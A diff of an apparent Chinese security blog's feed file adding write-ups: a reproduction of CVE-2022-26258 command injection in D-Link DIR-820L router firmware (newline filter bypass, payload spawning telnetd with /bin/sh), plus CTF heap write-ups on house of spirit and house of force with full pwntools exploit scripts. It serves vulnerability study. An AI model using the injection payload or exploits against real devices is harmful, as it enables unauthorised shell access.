+<p>进一步审计发现 copyDataToDataModelFormat是返回paramStr的也就是说 最后是提交给了get_set.ccp</p>
+<p><img src="/pic/CVE-2022-26258/3.png" alt="img"></p>
+<p>我们用grep -r “get_set.cpp”是查不到相关信息的，既然没有“get_set.ccp”文件，那么可能是这个URL会交给后端处理，处理好之后返回给用户结果。</p>
+<p><img src="/pic/CVE-2022-26258/4.png" alt="img"></p>
+<p>我们通过grep -r “get_set”发现这四个二进制文件中有调用于是我们进一步更进 去分析这四个二进制文件</p>
+<p>然后我们再去看一下开机自启文件包括哪些</p>
+<p><img src="/pic/CVE-2022-26258/5.png" alt="img"></p>
+<p>可以看到开机自启了ncc2和bulkListen</p>
+<p>所以可见正确答案是ncc2的位置，因为有get_set字符串和相对应的函数</p>
+<p><img src="/pic/CVE-2022-26258/6.png" alt="img"></p>
+<p>先对ncc2进行一个简单的分析</p>
+<p><img src="/pic/CVE-2022-26258/7.png" alt="img"></p>
+<p>这里先是对fork子进程的一个检测来判断ncc2是否启动，然后对信号量进行一系列的设置然后设置信号处理函数 再通过ncc_load_hw_cfg设置pin码(这里介绍一下 PIN码（Personal Identification Number, 个人识别号码）是一种为了安全目的而设计的数字代码，通常用于验证用户的身份) 在后面就是一些其他服务的配置部分了</p>
+<p>然后进一步分析 敏感函数 由于是命令执行我们去审system函数的代码</p>
+<p><img src="/pic/CVE-2022-26258/8.png" alt="img"></p>
+<p>这些都不存在命令任意执行漏洞，我们发现还有一个_system函数，想要快速的找到漏洞点就需要根据另一个线索点(Device Name)进行寻找。我们在搜索字符串时如果直接指定DeviceName还是比较难找到的，这里可以先简单搜索Device，然后搜索Name，寻找交叉点</p>
+<p><img src="/pic/CVE-2022-26258/9.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/10.png" alt="img"></p>
+<p>然后定位到sub_4F6DFC函数</p>
+<p><img src="/pic/CVE-2022-26258/11.png" alt="img"></p>
+<p>有两条路径一个利用下面的_system另一个是利用上面的_system</p>
+<p>先分析第一条路径：</p>
+<p>关键是看a2是否可控：</p>
+<p><img src="/pic/CVE-2022-26258/12.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/13.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/14.png" alt="img"></p>
+<p>发现不可控 此路不通0……….0</p>
+<p>第二条路径：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Obj = (const char **)getObj(0x60u, (int)v9);</span><br><span class="line">v4 = Obj;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>v4是<code>getObj</code>函数的返回值Obj，需要绕过<code>hasInjectionString</code>的判断才能到达命令注入点，现在需要找到<code>hasInjectionString</code> 函数在哪个文件中，同样使用<code>grep -r</code> 命令：</p>
+<p><img src="/pic/CVE-2022-26258/15.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/16.png" alt="img"></p>
+<p>这里就是一些简单的过滤 没有过滤冒号和换行符，可以使用“\n”来绕过</p>
+<p>这里就可以通过修改参数来进行命令执行了</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR820L /home/luyouqi/模拟/Dir-820/DIR820LA1_FW105B03.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<p>用FIRMAE进行环境直接模拟</p>
+<p><img src="/pic/CVE-2022-26258/17.png" alt="img"></p>
+<p>模拟好之后是这样 访问后</p>
+<p><img src="/pic/CVE-2022-26258/18.png" alt="img"></p>
+<p>默认密码是空直接登录就可 必须要登录这是验证后的命令执行漏洞</p>
+<p><img src="/pic/CVE-2022-26258/19.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/20.png" alt="img"></p>
+<p>修改红框参数为 %0atelnetd  -l /bin/sh%0a</p>
+<p>这里要注意直接在原包上进行修改 而不是放入重放后修改再发送，原因是会认定发送了多次导致崩溃 无法执行，发送后在等十秒就可以了</p>
+<p><img src="/pic/CVE-2022-26258/21.png" alt="img"></p>
+<p>再用telnet进行连接 就可以成功拿到shell</p>
+<p><img src="/pic/CVE-2022-26258/22.png" alt="img"></p>
+<h2 id="额外挖掘"><a href="#额外挖掘" class="headerlink" title="额外挖掘"></a>额外挖掘</h2><p>额外漏洞查找，一般漏洞存在就意味着肯定不只一个 我们继续去查询可能涉及到http_post且是需要执行的语句</p>
+<p><img src="/pic/CVE-2022-26258/23.png" alt="img"></p>
+<p>可以看到这个界面也是post指令传入 那我们就跟进tools_vct.asp查看</p>
+<p><img src="/pic/CVE-2022-26258/24.png" alt="img"></p>
+<p>传入的是ping.cpp</p>
+<p>通过前面的过程 查询发现可能还是在ncc2中 继续审代码发现</p>
+<p><img src="/pic/CVE-2022-26258/25.png" alt="img"></p>
+<p>是不是非常熟悉基本和前面那个洞没区别了</p>
+<p><img src="/pic/CVE-2022-26258/26.png" alt="img"></p>
+<p>然后发送 之后连接看看能否拿到shell</p>
+<p><img src="/pic/CVE-2022-26258/27.png" alt="img"></p>
+<p>成功了！！！！ </p>
+<p>刚准备去交cnvd的 结果一查</p>
+<p><img src="/pic/CVE-2022-26258/28.png" alt="img"></p>
+<p>得 白高兴一场 早被打了</p>
+<p>参考文献：<a href="https://cn-sec.com/archives/1262036.html">https://cn-sec.com/archives/1262036.html</a></p>
+]]></content>
+      <categories>
+        <category>iot</category>
+        <category>漏洞复现</category>
+        <category>dir</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现---命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house-of-Spirit</title>
+    <url>/2024/08/15/house%20of%20spirit/</url>
+    <content><![CDATA[<h2 id="House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。"><a href="#House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。" class="headerlink" title="House of Spirit 是 the Malloc Maleficarum 中的一种技术。"></a>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</h2><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+</ul>
+<h3 id="我们通过原理去分析-这些检测的绕过的代码原理"><a href="#我们通过原理去分析-这些检测的绕过的代码原理" class="headerlink" title="我们通过原理去分析 这些检测的绕过的代码原理"></a>我们通过原理去分析 这些检测的绕过的代码原理</h3><h3 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h3><p>因为fake_chunk可以在任意可写位置构造，这里对齐指的是地址上的对齐而不仅仅是内存对齐，比如32位程序的话fake_chunk的prev_size所在地址就应该位<code>0xXXXX0</code>或<code>0xXXXX4</code>。64位的话地址就应该在<code>0xXXXX0</code>或<code>0xXXXX8</code></p>
+<h3 id="fake-chunk-的-ISMMAP"><a href="#fake-chunk-的-ISMMAP" class="headerlink" title="fake chunk 的 ISMMAP"></a>fake chunk 的 ISMMAP</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#if HAVE_MMAP   </span><br><span class="line">    if (chunk_is_mmapped(p))       /* release mmapped memory. */</span><br><span class="line">    {     /* see if the dynamic brk/mmap threshold needs adjusting */</span><br><span class="line">        if (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold         </span><br><span class="line">            &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)       </span><br><span class="line">        {         </span><br><span class="line">            mp_.mmap_threshold = chunksize (p);</span><br><span class="line">            mp_.trim_threshold = 2 * mp_.mmap_threshold;       </span><br><span class="line">        }     </span><br><span class="line">        munmap_chunk(p);     </span><br><span class="line">    return;   </span><br><span class="line">    }</span><br><span class="line"> #endi</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到， MMAP 位需要置 0 ，否则 free 会，调用 munmap_chunk() 函数 unmap 本 chunk ，达不到进入 fastbin 的目的。</p>
+<h2 id="fake-chunk-的-size"><a href="#fake-chunk-的-size" class="headerlink" title="fake chunk 的 size"></a>fake chunk 的 size</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (*fb != NULL</span><br><span class="line">    &amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, 0))               </span><br><span class="line">    {         </span><br><span class="line">        errstr = "invalid fastbin entry (free)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p> fake chunk 的 size 大小 需要满足对应的 fastbin 的 index ，同时也得对齐。</p>
+<h2 id="fake-chunk-的-next-chunk"><a href="#fake-chunk-的-next-chunk" class="headerlink" title="fake chunk 的 next chunk"></a>fake chunk 的 next chunk</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))&gt;= av-&gt;system_mem, 0))       </span><br><span class="line">    { </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">    /* We might not have a lock at this point and concurrent modifications</span><br><span class="line">       of system_mem might have let to a false positive.  Redo the test</span><br><span class="line">       after getting the lock.  */</span><br><span class="line">    if (have_lock</span><br><span class="line">        || ({ assert (locked == 0);</span><br><span class="line">              mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">              locked = 1;</span><br><span class="line">              chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ                     </span><br><span class="line">              || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;               </span><br><span class="line">            })) </span><br><span class="line">#endif           </span><br><span class="line">            {             </span><br><span class="line">                errstr = "free(): invalid next size (fast)";             </span><br><span class="line">                goto errout;           </span><br><span class="line">            } </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">            if (! have_lock)           </span><br><span class="line">                {             </span><br><span class="line">                    (void)mutex_unlock(&amp;av-&gt;mutex);             </span><br><span class="line">                    locked = 0;           </span><br><span class="line">                } </span><br><span class="line">#endif       </span><br><span class="line">    } </span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="fake-chunk-对应的-fastbin-链表头部"><a href="#fake-chunk-对应的-fastbin-链表头部" class="headerlink" title="fake chunk 对应的 fastbin 链表头部"></a>fake chunk 对应的 fastbin 链表头部</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (*fb == p, 0))       </span><br><span class="line">    {         </span><br><span class="line">        errstr = "double free or corruption (fasttop)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    } </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="例题-I-ctf-pwn200"><a href="#例题-I-ctf-pwn200" class="headerlink" title="例题 I ctf pwn200"></a>例题 I ctf pwn200</h2><h3 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路:"></a>核心思路:</h3><p>通过house of spirit 进行fake chunk的伪造在栈上布置fake chunk 然后劫持程序流 走ret2shellcode</p>
+<h3 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h3><p><img src="/pic/house_of_spirit/0.png" alt="img"></p>
+<p>通过静态分析我们可以了解基本思路，接下来我们通过动态调试去看看</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('1') 错误 改为52</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>特别注意</strong> 这里的id不能输入小2*minsize的值 因为是作为下一个chunk的size 位 要满足check的条件 不然就会报错</p>
+<p>看一下我们输入的值和泄露的地址的布局</p>
+<p><img src="/pic/house_of_spirit/1.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进行覆盖修改ptr和fake chunk的伪造</p>
+<p><img src="/pic/house_of_spirit/2.png" alt="img"></p>
+<p>然后我们把这个fake_chunk free 再add回来劫持控制流</p>
+<p><img src="/pic/house_of_spirit/3.png" alt="img"></p>
+<p><img src="/pic/house_of_spirit/4.png" alt="img"></p>
+<p>成功shell</p>
+<p><img src="/pic/house_of_spirit/5.png" alt="img"></p>
+<p>exp如下:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./pwn200"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">dbg()</span><br><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('52')</span><br><span class="line">pause()</span><br><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br><span class="line">pause()</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"2")</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"1")</span><br><span class="line">rl("how long?\n")</span><br><span class="line">sl(str(0x30))</span><br><span class="line">rl("give me more money : \n")</span><br><span class="line">payload=p64(0)*3+p64(stack_addr-0x50)</span><br><span class="line">mx.send(payload)</span><br><span class="line"># payload</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
 ]]></content>
       <categories>
         <category>pwn学习</category>
@@ -597,6 +534,69 @@ stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
       </categories>
       <tags>
         <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house_of_force进阶(和tcache污染结合)</title>
+    <url>/2024/08/17/house%20of%20force%20upgrade%20/</url>
+    <content><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>常规使用的house of force 是通过泄露了堆和libc的地址来修改hook函数导致的shell</p>
+<p>而无法泄露堆地址的情况，按常规的思路就打不了了，这时候就出现了house of force 进阶搭配tcache 头污染，可以避免部分情况去走io链</p>
+<h2 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h2><p>libc 2.23-2.27</p>
+<h2 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h2><p>泄露libc地址后，通过改top chunk为-1，然后申请负堆块，把堆块也就是top chunk控到tcache头开始的位置，然后污染tcache头 植入hook函数的地址 在取出来达到任意写的目的</p>
+<h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/0.png" alt="img"></p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/1.png" alt="img"></p>
+<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/2.png" alt="img"></p>
+<p>这里free的功能实际上是不存在的，这看上去是加密的一个过程</p>
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/3.png" alt="img"></p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/4.png" alt="img"></p>
+<p>输入多少字节就读入多少字节，这里明显存在一个堆溢出</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>由于没有free函数 我们可以用house of orange 前期的思路去泄露libc地址，然后通过堆溢出改写top chunk为-1，把堆地址控到tcache头，然后污染，提取出hook函数的地址 并进行修改，改为ogg，由于题目条件限制，这里ogg是打不通的，需要用realloc调栈帧</p>
+<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add(0x18)#0</span><br><span class="line">edit(0,b'a'*0x18+p64(0xd91))</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/5.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add(0x1008) #old topchunk to unsortedbin  1</span><br><span class="line">add(0xd60)#2</span><br><span class="line">show(2)</span><br><span class="line">libc_addr=l64()-0x3ebca0</span><br><span class="line">libc.address=libc_addr</span><br><span class="line">malloc_hook=libc.sym['__malloc_hook']-8</span><br><span class="line">realloc_hook=libc.sym['realloc']+2</span><br><span class="line">log_addr(libc_addr)</span><br><span class="line">libc.address=libc_addr</span><br></pre></td></tr></tbody></table></figure>
+
+<h5 id="house-of-force部分"><a href="#house-of-force部分" class="headerlink" title="house of force部分"></a>house of force部分</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">edit(1,b'\x00'*0x1008+p64(0xffffffffffffffff))</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/6.png" alt="img"></p>
+<p>这里算是关键，我开始就是卡在照着heap显示的堆修改的top chunk，其实应该是修改当时申请的0x1008这个堆</p>
+<h5 id="tcache头污染"><a href="#tcache头污染" class="headerlink" title="tcache头污染"></a>tcache头污染</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add(-0x22010)#3</span><br><span class="line">add(0x100)#4</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/7.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload=b'\x07'*0x30+p64(malloc_hook)*0x10+b'\n'</span><br><span class="line">edit(4,payload)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>污染前：</p>
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/8.png" alt="img"></p>
+<p>污染后：</p>
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/9.png" alt="img"></p>
+<h5 id="修改hook地址"><a href="#修改hook地址" class="headerlink" title="修改hook地址"></a>修改hook地址</h5><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/10.png" alt="img"></p>
+<p>成功修改，拿到shell</p>
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/11.png" alt="img"></p>
+<p>这里展示一下调栈帧打ogg的过程</p>
+<p>要满足的条件：</p>
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/12.png" alt="img"></p>
+<p>要满足三个条件：</p>
+<ol>
+<li>地址rsp+0x50要可写</li>
+<li>rsp &amp; 0xf ==0</li>
+<li>rcx == NULL</li>
+</ol>
+<p>修改前：</p>
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/13.png" alt="img"></p>
+<p>可以看到rsp不满足条件2，此时是realloc的情况，而为了让它满足我们只需要让rsp上调0x8就可以了 我们把realloc往上调整一个push</p>
+<p>也就是realloc+2</p>
+<p>修改后：</p>
+<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/14.png" alt="img"></p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./pwn"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">def add(size):</span><br><span class="line">	sla("Enter 1 to add, 2 to free, 3 to show, 4 to edit, 0 to exit:",b'1')</span><br><span class="line">	sla(":",str(size))</span><br><span class="line">def edit(idx,payload):</span><br><span class="line">	sla(":",b'4')</span><br><span class="line">	sla(b":",str(idx))</span><br><span class="line">	sla(b"size\n",str(len(payload)))</span><br><span class="line">	s(payload)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(":",b'3')</span><br><span class="line">	sla(b":",str(idx))</span><br><span class="line">	#sa(b":",payload)</span><br><span class="line">dbg()</span><br><span class="line">add(0x18)#0</span><br><span class="line">edit(0,b'a'*0x18+p64(0xd91))</span><br><span class="line">add(0x1008) #old topchunk to unsortedbin  1</span><br><span class="line"></span><br><span class="line">add(0xd60)#2</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">libc_addr=l64()-0x3ebca0</span><br><span class="line">libc.address=libc_addr</span><br><span class="line">malloc_hook=libc.sym['__malloc_hook']-8</span><br><span class="line">realloc_hook=libc.sym['realloc']+2</span><br><span class="line">log_addr(libc_addr)</span><br><span class="line">libc.address=libc_addr</span><br><span class="line"></span><br><span class="line">edit(1,b'\x00'*0x1008+p64(0xffffffffffffffff))</span><br><span class="line">add(-0x22010)#3</span><br><span class="line">add(0x100)#4</span><br><span class="line">payload=b'\x07'*0x30+p64(malloc_hook)*0x10+b'\n'</span><br><span class="line">edit(4,payload)</span><br><span class="line">add(0x100)#5</span><br><span class="line">#edit()</span><br><span class="line">ogg=libc_addr+0x4f2c5</span><br><span class="line">#0x4f2be 0x4f2c5 0x4f322 0x10a38c</span><br><span class="line">edit(5,p64(ogg)+p64(realloc_hook))</span><br><span class="line">#dbg()</span><br><span class="line">pause()</span><br><span class="line">sla("Enter 1 to add, 2 to free, 3 to show, 4 to edit, 0 to exit:",b'1')</span><br><span class="line">sla(":",b'0x100')</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house of</tag>
       </tags>
   </entry>
   <entry>
